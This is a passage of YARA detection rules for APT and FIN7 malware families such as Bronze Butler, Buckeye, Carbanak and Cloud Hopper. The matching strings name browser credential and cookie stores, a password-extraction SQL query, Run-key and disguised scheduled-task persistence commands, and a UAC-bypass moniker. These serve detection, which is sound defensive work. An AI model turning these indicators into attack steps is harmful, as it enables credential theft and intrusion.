\"\\\\Microsoft\\\\Microsoft\\\\Microsoft.log\" fullword wide\n        $x6 = \"\\\\Microsoft\\\\newPP.exe\" fullword wide\n        $x7 = \" (this is probably a proxy server error).\" fullword wide\n        $x8 = \" :Old - update patch and check anti-virus.. \" fullword wide\n        $x9 = \"PatchNotExit-- download now.. \" fullword wide\n        $x10 = \"PatchNotExit-- Check Version\" fullword wide\n        $x11 = \"PatchNotExit-- Version Patch\" fullword wide\n        $s1 = \"downloader \" fullword wide\n        $s2 = \"DelDownloadFile\" fullword ascii\n        $s3 = \"downloadFile\" fullword ascii\n        $s4 = \"downloadUpdate\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 600KB and (1 of ($x*) or 4 of them))\n}\n\nrule BadPatch_WinAgent_BadPatch_2\n{\n    meta:\n        description = \"Samples mentioned in BadPatch report\"\n        threat_names = \"BadPatch\"\n        ref = \"https://goo.gl/RvDwwA\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WinAgent_BadPatch_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"myAction=shell_result&serialNumber=\" fullword wide\n        $s2 = \"\\\\Appdata\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data.*\" fullword wide\n        $s3 = \"\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\" fullword wide\n        $s4 = \"\\\\Appdata\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies.*\" fullword wide\n        $s5 = \"newSHELL[\" fullword wide\n        $s6 = \"\\\\file1.txt\" fullword wide\n        $s7 = \"myAction=newGIF&serialNumber=\" fullword wide\n        $s8 = \"\\\\Storege1\" fullword wide\n        $s9 = \"\\\\Microsoft\\\\mac.txt\" fullword wide\n        $s10 = \"spytube____:\" fullword ascii\n        $s11 = \"0D0700045F5C5B0312045A04041F40014B1D11004A1F19074A141100011200154B031C04\" fullword wide\n        $s12 = \"16161A1000012B162503151851065A1A0007\" fullword wide\n        $s13 = \"-- SysFile....\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 700KB and 3 of them)\n}\n\nrule BronzeButler_Daserf_Delphi_1\n{\n    meta:\n        description = \"Malware / hacktool sample from Bronze Butler incident\"\n        threat_names = \"Bronze Butler\"\n        ref = \"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"BronzeButler_Daserf_Delphi_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Services.exe\" fullword ascii\n        $s2 = \"Mozilla/4.0 (compatible; MSIE 11.0; Windows NT 6.1; SV1)\" fullword ascii\n        $s3 = \"l32.dll\" fullword ascii\n        $s4 = \"tProcess:\" fullword ascii\n        $s5 = \" InjectPr\" ascii\n        $s6 = \"Write$Error creating variant or safe array\u001fInvalid argument to time encode\" fullword wide\n        $s7 = \"on\\\\run /v \" fullword ascii\n        $s8 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\run\" fullword ascii\n        $s9 = \"ms1ng2d3d2.exe\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and 3 of them)\n}\n\nrule BronzeButler_Daserf_C_1\n{\n    meta:\n        description = \"Malware / hacktool sample from Bronze Butler incident\"\n        threat_names = \"Bronze Butler\"\n        ref = \"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"BronzeButler_Daserf_C_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"(c) 2010 DYAMAR EnGineerinG, All rights reserved, http://www.dyamar.com.\" fullword ascii\n        $s2 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1)\" fullword ascii\n        $a1 = \"ndkkwqgcm\" fullword ascii\n        $a2 = \"RtlGetCo\" fullword ascii\n        $a3 = \"hutils\" fullword ascii\n        $b1 = \"%USERPROFILE%\\\\System\" fullword ascii\n        $b2 = \"msid.dat\" fullword ascii\n        $b3 = \"DRIVE_REMOTE\" fullword wide\n        $b4 = \"%s%s%s%s%s%s%s%s%s%s%s%s\" fullword ascii\n        $b5 = \"jcbhe.asp\" fullword ascii\n        $b6 = \"edset.asp\" fullword ascii\n        $b7 = \"bxcve.asp\" fullword ascii\n        $b8 = \"hcvery.php\" fullword ascii\n        $b9 = \"ynhkef.php\" fullword ascii\n        $b10 = \"dkgwey.php\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and (pe.imphash() == \"088382f4887e3b2c4bd5157f2d72b618\" or all of ($a*) or 4 of them)\n}\n\nrule BronzeButler_DGet_1\n{\n    meta:\n        description = \"Malware / hacktool sample from Bronze Butler incident\"\n        threat_names = \"Bronze Butler\"\n        ref = \"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"BronzeButler_DGet_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"DGet Tool Made by XZ\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 10KB and 1 of them)\n}\n\nrule BronzeButler_UACBypass_1\n{\n    meta:\n        description = \"Malware / hacktool sample from Bronze Butler incident\"\n        threat_names = \"Bronze Butler\"\n        ref = \"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"BronzeButler_UACBypass_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\Release\\\\BypassUacDll.pdb\" ascii\n        $x2 = \"%programfiles%internet exploreriexplore.exe\" fullword wide\n        $x3 = \"Elevation:Administrator!new:{3ad055\" fullword wide\n        $x4 = \"BypassUac.pdb\" fullword ascii\n        $x5 = \"[bypassUAC] started X64\" fullword wide\n        $x6 = \"[bypassUAC] started X86\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them)\n}\n\nrule BronzeButler_xxmm_1\n{\n    meta:\n        description = \"Malware / hacktool sample from Bronze Butler incident\"\n        threat_names = \"Bronze Butler\"\n        ref = \"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"BronzeButler_xxmm_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\Release\\\\ReflectivLoader.pdb\" ascii\n        $x3 = \"\\\\Projects\\\\xxmm2\\\\Release\\\\\" ascii\n        $x5 = \"http://127.0.0.1/phptunnel.php\" fullword ascii\n        $s1 = \"xxmm2.exe\" fullword ascii\n        $s2 = \"\\\\AvUpdate.exe\" fullword wide\n        $s3 = \"stdapi_fs_file_download\" fullword ascii\n        $s4 = \"stdapi_syncshell_open\" fullword ascii\n        $s5 = \"stdapi_execute_sleep\" fullword ascii\n        $s6 = \"stdapi_syncshell_kill\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 700KB and (1 of ($x*) or 4 of them)\n}\n\nrule BronzeButler_RarStar_1\n{\n    meta:\n        description = \"Malware / hacktool sample from Bronze Butler incident\"\n        threat_names = \"Bronze Butler\"\n        ref = \"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"BronzeButler_RarStar_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Mozilla/4.0+(compatible;+MSIE+8.0;+Windows+NT+6.0;+SV1)\" fullword wide\n        $s2 = \"http://www.google.co.jp\" fullword wide\n        $s3 = \"16D73E22-873D-D58E-4F42-E6055BC9825E\" fullword ascii\n        $s4 = \"\\\\*.rar\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 2 of them)\n}\n\nrule BronzeButler_Daserf_Nov1_BronzeButler\n{\n    meta:\n        description = \"Daserf malware used by Bronze Butler\"\n        threat_names = \"Bronze Butler\"\n        ref = \"https://goo.gl/ffeCfd\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Daserf_Nov1_BronzeButler\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"mstmp1845234.exe\" fullword ascii\n        $x2 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; SV1)\" fullword ascii\n        $x3 = \"Mozilla/4.0 (compatible; MSIE 11.0; Windows NT 6.1; SV1)\" fullword ascii\n        $s1 = \"Content-Type: */*\" fullword ascii\n        $s2 = \"ProxyEnable\" ascii fullword\n        $s3 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\" ascii fullword\n        $s4 = \"iexplore.exe\" ascii fullword\n        $s5 = \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\Cu\" fullword ascii\n        $s6 = \"rrentVersion\\\\Internet Settings\" fullword ascii\n        $s7 = \"ws\\\\CurrentVersion\\\\Inter\" fullword ascii\n        $s8 = \"Documents an\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 700KB and (1 of ($x*) or 5 of them)\n}\n\nrule Buckeye_Osinfo\n{\n    meta:\n        description = \"OSinfo tool used by the Buckeye APT group\"\n        threat_names = \"OSinfo, Buckeye\"\n        ref = \"http://www.symantec.com/connect/blogs/buckeye-cyberespionage-group-shifts-gaze-us-hong-kong\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Buckeye_Osinfo\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"-s ShareInfo ShareDir\" fullword ascii\n        $s2 = \"-a Local And Global Group User Info\" fullword ascii\n        $s3 = \"-f <infile> //input server list from infile, OneServerOneLine\" fullword ascii\n        $s4 = \"info <\\\\server> <user>\" fullword ascii\n        $s5 = \"-c Connect Test\" fullword ascii\n        $s6 = \"-gd Group Domain Admins\" fullword ascii\n        $s7 = \"-n NetuseInfo\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and 3 of ($s*)\n}\n\nrule Buckeye_RemoteCmd\n{\n    meta:\n        description = \"Remote access tool used by APT groups (file: RemoteCmd.exe)\"\n        threat_names = \"RemoteCmd\"\n        ref = \"http://goo.gl/igxLyF\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RemoteCmd\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"RemoteCmd.exe\" fullword wide\n        $s2 = \"\\\\Release\\\\RemoteCmd.pdb\" fullword ascii\n        $s3 = \"RemoteCmd [ComputerName] [Executable] [Param1] [Param2] ...\" fullword wide\n        $s4 = \"http://{0}:65101/CommandEngine\" fullword wide\n        $s5 = \"Brenner.RemoteCmd.Client\" fullword ascii\n        $s6 = \"$b1888995-1ee5-4f6d-82df-d2ab8ae73d63\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 50KB and 2 of them) or (4 of them)\n}\n\nrule Buckeye_ChromePass\n{\n    meta:\n        description = \"Tool used by APT groups (file: ChromePass.exe)\"\n        threat_names = \"ChromePass\"\n        ref = \"http://goo.gl/igxLyF\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ChromePass\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\Release\\\\ChromePass.pdb\" fullword ascii\n        $x2 = \"Windows Protect folder for getting the encryption keys\" wide\n        $x3 = \"Chrome User Data folder where the password file is stored\" wide\n        $s1 = \"Opera Software\\\\Opera Stable\\\\Login Data\" fullword wide\n        $s2 = \"Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Login Data\" fullword wide\n        $s3 = \"Load the passwords from another Windows user or external drive: \" fullword wide\n        $s4 = \"Chrome Passwords List!Select the windows profile folder\" fullword wide\n        $s5 = \"Load the passwords of the current logged-on user\" fullword wide\n        $s6 = \"Windows Login Password:\" fullword wide\n        $s7 = \"SELECT origin_url, action_url, username_element, username_value, password_element, password_value, signon_realm, date_created fr\" ascii\n        $s8 = \"Chrome Password Recovery\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 700KB and 1 of ($x*)) or (5 of them)\n}\n\nrule Carbanak_0915_1\n{\n    meta:\n        description = \"Carbanak Malware\"\n        threat_names = \"FIN7\"\n        ref = \"https://www.csis.dk/en/csis/blog/4710/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Carbanak_0915_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"evict1.pdb\" fullword ascii\n        $s2 = \"http://testing.corp 0\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and 1 of them\n}\n\nrule Carbanak_0915_2\n{\n    meta:\n        description = \"Carbanak Malware\"\n        threat_names = \"FIN7\"\n        ref = \"https://www.csis.dk/en/csis/blog/4710/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Carbanak_0915_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"8Rkzy.exe\" fullword wide\n        $s1 = \"Export Template\" fullword wide\n        $s2 = \"Session folder with name '%s' already exists.\" fullword ascii\n        $s3 = \"Show Unconnected Endpoints (Ctrl+U)\" fullword ascii\n        $s4 = \"Close All Documents\" fullword wide\n        $s5 = \"Add &Resource\" fullword ascii\n        $s6 = \"PROCEXPLORER\" fullword wide\n        $s7 = \"AssocQueryKeyA\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and ($x1 or all of ($s*))\n}\n\nrule Carbanak_0915_3\n{\n    meta:\n        description = \"Carbanak Malware\"\n        threat_names = \"FIN7\"\n        ref = \"https://www.csis.dk/en/csis/blog/4710/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Carbanak_0915_3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\" fullword ascii\n        $s2 = \"SHInvokePrinterCommandA\" fullword ascii\n        $s3 = \"Ycwxnkaj\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 700KB and all of them\n}\n\nrule Carbanak_FIN7_Dropper_Aug17\n{\n    meta:\n        description = \"Word Dropper from Proofpoint FIN7 Report\"\n        threat_names = \"FIN7\"\n        ref = \"https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FIN7_Dropper_Aug17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"tpircsj:e/ b// exe.tpircsw\\\" rt/\" fullword ascii\n        $s1 = \"Scripting.FileSystemObject$\" fullword ascii\n        $s2 = \"PROJECT.THISDOCUMENT.AUTOOPEN\" fullword wide\n        $s3 = \"Project.ThisDocument.AutoOpen\" fullword wide\n        $s4 = \"\\\\system3\" fullword ascii\n        $s5 = \"ShellV\" fullword ascii\n\n    condition:\n        (uint16(0) == 0xcfd0 and filesize < 700KB and 1 of ($x*) or all of ($s*))\n}\n\nrule Carbanak_FIN7_Backdoor_Aug17\n{\n    meta:\n        description = \"Word Dropper from Proofpoint FIN7 Report\"\n        threat_names = \"FIN7\"\n        ref = \"https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FIN7_Backdoor_Aug17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"wscript.exe //b /e:jscript C:\\\\Users\\\\\" ascii\n        $x2 = \"wscript.exe /b /e:jscript C:\\\\Users\\\\\" ascii\n        $x3 = \"schtasks /Create /f /tn \\\"GoogleUpdateTaskMachineSystem\\\" /tr \\\"wscript.exe\" ascii nocase\n        $x4 = \"schtasks /Delete /F /TN \\\"\\\"GoogleUpdateTaskMachineCore\" ascii nocase\n        $x5 = \"schtasks /Delete /F /TN \\\"GoogleUpdateTaskMachineCore\" ascii nocase\n        $x6 = \"wscript.exe //b /e:jscript %TMP%\\\\debug.txt\" ascii\n        $s1 = \"/?page=wait\" fullword ascii\n        $a1 = \"autoit3.exe\" fullword ascii\n        $a2 = \"dumpcap.exe\" fullword ascii\n        $a3 = \"tshark.exe\" fullword ascii\n        $a4 = \"prl_cc.exe\" fullword ascii\n        $v1 = \"vmware\" fullword ascii\n        $v2 = \"PCI\\\\\\\\VEN_80EE&DEV_CAFE\" fullword ascii\n        $v3 = \"VMWVMCIHOSTDEV\" fullword ascii\n        $c1 = \"apowershell\" fullword ascii\n        $c2 = \"wpowershell\" fullword ascii\n        $c3 = \"get_passwords\" fullword ascii\n        $c4 = \"kill_process\" fullword ascii\n        $c5 = \"get_screen\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 5000KB and (1 of ($x*) or all of ($a*) or all of ($v*) or 3 of ($c*))) or 5 of them\n}\n\nrule ClandestineWolf\n{\n    meta:\n        description = \"Operation Clandestine Wolf signature\"\n        threat_names = \"Clandestine Wolf, APT3\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"NDF\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"OpClandestineWolf\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"flash.Media.Sound()\"\n        $s1 = \"call Kernel32!VirtualAlloc(0x1f140000hash$=0x10000hash$=0x1000hash$=0x40)\"\n        $s2 = \"{4D36E972-E325-11CE-BFC1-08002BE10318}\"\n        $s3 = \"NetStream\"\n\n    condition:\n        all of them\n}\n\nrule CloudHopper_Malware_1\n{\n    meta:\n        description = \"Malware from Operation Cloud Hopper\"\n        threat_names = \"Cloud Hopper, APT10\"\n        ref = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OpCloudHopper_Malware_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"zok]\\\\\\\\\\\\ZZYYY666564444\" fullword ascii\n        $s2 = \"z{[ZZYUKKKIIGGGGGGGGGGGGG\" fullword ascii\n        $s3 = \"EEECEEC\" fullword ascii\n        $s4 = \"IIEFEE\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and all of them)\n}\n\nrule CloudHopper_Malware_2\n{\n    meta:\n        description = \"Malware from Operation Cloud Hopper\"\n        threat_names = \"Cloud Hopper, APT10\"\n        ref = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OpCloudHopper_Malware_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"sERvEr.Dll\" fullword ascii\n        $x2 = \"ToolbarF.dll\" fullword wide\n        $x3 = \".?AVCKeyLoggerManager@@\" fullword ascii\n        $x4 = \"GH0STCZH\" ascii\n        $s1 = \"%%SystemRoot%%\\\\System32\\\\svchost.exe -k \\\"%s\\\"\" fullword wide\n        $s2 = \"rundll32.exe \\\"%s\\\", UnInstall /update %s\" fullword wide\n        $s3 = \"\\\\Release\\\\Loader.pdb\" fullword ascii\n        $s4 = \"%s\\\\%x.dll\" fullword wide\n        $s5 = \"Mozilla/4.0 (compatible)\" fullword wide\n        $s6 = \"\\\\syslog.dat\" fullword wide\n        $s7 = \"NSOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" fullword wide\n        $op1 = { 8d 34 17 8d 49 00 8a 14 0e 3a 14 29 75 05 41 3b }\n        $op2 = { 83 e8 14 78 cf c1 e0 06 8b f8 8b c3 8a 08 84 c9 }\n        $op3 = { 3b fb 7d 3f 8a 4d 14 8d 45 14 84 c9 74 1b 8a 14 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 900KB and (1 of ($x*) or 3 of ($s*)) or all of ($op*)) or (6 of them)\n}\n\nrule CloudHopper_Malware_3\n{\n    meta:\n        description = \"Malware from Operation Cloud Hopper\"\n        threat_names = \"Cloud Hopper, APT10\"\n        ref = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OpCloudHopper_Malware_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s6 = \"operator \\\"\\\" \" fullword ascii\n        $s7 = \"zok]\\\\\\\\\\\\ZZYYY666564444\" fullword ascii\n        $s11 = \"InvokeMainViaCRT\" fullword ascii\n        $s12 = \".?AVAES@@\" fullword ascii\n        $op1 = { b6 4c 06 f5 32 cf 88 4c 06 05 0f b6 4c 06 f9 32 }\n        $op2 = { 06 fc eb 03 8a 5e f0 85 c0 74 05 8a 0c 06 eb 03 }\n        $op3 = { 7e f8 85 c0 74 06 8a 74 06 08 eb 03 8a 76 fc 85 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 600KB and (all of ($s*) and 1 of ($op*)) or all of ($op*)) or (5 of them)\n}\n\nrule CloudHopper_Dropper_1\n{\n    meta:\n        description = \"Malware from Operation Cloud Hopper\"\n        threat_names = \"Cloud Hopper, APT10\"\n        ref = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OpCloudHopper_Dropper_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"{\\\\version2}{\\\\edmins0}{\\\\nofpages1}{\\\\nofwords11}{\\\\nofchars69}{\\\\*\\\\company google}{\\\\nofcharsws79}{\\\\vern24611}{\\\\*\\\\password\" ascii\n\n    condition:\n        (uint16(0) == 0x5c7b and filesize < 700KB and all of them)\n}\n\nrule CloudHopper_Malware_4\n{\n    meta:\n        description = \"Malware from Operation Cloud Hopper\"\n        threat_names = \"Cloud Hopper, APT10\"\n        ref = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OpCloudHopper_Malware_4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s6 = \"operator \\\"\\\" \" fullword ascii\n        $s9 = \"InvokeMainViaCRT\" fullword ascii\n        $s10 = \".?AVAES@@\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 800KB and all of them)\n}\n\nrule CloudHopper_Malware_5\n{\n    meta:\n        description = \"Malware from Operation Cloud Hopper\"\n        threat_names = \"Cloud Hopper, APT10\"\n        ref = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OpCloudHopper_Malware_5\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"CWINDOWSSYSTEMROOT\" fullword ascii\n        $x2 = \"YJ_D_KROPOX_M_NUJI_OLY_S_JU_MOOK\" fullword ascii\n        $x3 = \"NJK_JK_SED_PNJHGFUUGIOO_PIY\" fullword ascii\n        $x4 = \"c_VDGQBUl}YSB_C_VDlqSDYFU\" fullword ascii\n        $s7 = \"FALLINLOVE\" fullword ascii\n        $op1 = { 83 ec 60 8d 4c 24 00 e8 6f ff ff ff 8d 4c 24 00 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and (1 of ($x*) or 2 of them)) or (4 of them)\n}\n\nrule CloudHopper_Malware_6\n{\n    meta:\n        description = \"Malware from Operation Cloud Hopper\"\n        threat_names = \"Cloud Hopper, APT10\"\n        ref = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OpCloudHopper_Malware_6\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"YDNCCOVZKXGRVQPOBRNXXQVNQYXBBCONCOQEGYELIRBEYOVODGXCOXTHXPCXNGUCHRVWKKZSYQMAOWWGHRSPRGSEUWYMEFZHRTHO\" fullword ascii\n        $s2 = \"psychiatry.dat\" fullword ascii\n        $s3 = \"meekness.lnk\" fullword ascii\n        $s4 = 